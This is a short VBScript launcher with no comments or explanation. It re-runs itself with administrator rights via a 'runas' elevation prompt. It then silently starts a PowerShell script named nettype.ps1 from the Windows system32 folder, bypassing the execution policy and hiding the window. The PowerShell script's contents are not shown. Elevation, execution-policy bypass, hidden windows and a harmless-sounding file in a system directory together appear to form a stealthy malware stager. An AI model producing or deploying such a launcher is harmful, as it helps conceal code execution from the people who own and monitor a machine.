Set objShell = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevated") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If
psScriptPath = "C:\windows\system32\nettype.ps1"
Set objWshShell = CreateObject("WScript.Shell")
command = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File """ & psScriptPath & """"
objWshShell.Run command, 0, False
